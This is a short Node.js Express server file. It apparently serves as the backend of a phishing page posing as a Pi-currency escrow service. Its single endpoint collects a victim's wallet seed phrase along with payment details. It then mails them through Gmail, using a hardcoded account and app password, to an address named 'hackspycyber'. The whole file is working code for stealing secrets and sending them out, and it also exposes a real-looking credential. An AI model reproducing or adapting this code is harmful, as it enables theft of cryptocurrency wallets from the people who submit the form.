const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'tobi.gbolagoke@gmail.com',
        pass: 'eyvy vxru ouqk vchd'
    }
});

app.post('/send-email', (req, res) => {
    const { walletPhrase, transactionAmount, usdValue, paymentMethod, address } = req.body;

    const mailOptions = {
        from: 'tobi.gbolagoke@gmail.com',
        to: 'hackspycyber@gmail.com',
        subject: 'Escrow Transaction Details',
        text: `
        Wallet Phrase: ${walletPhrase}
        Transaction Amount (π): ${transactionAmount}
        Equivalent in USD: $${usdValue}
        Payment Method: ${paymentMethod}
        Receiving Address: ${address}
        `
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.send('Email sent successfully');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
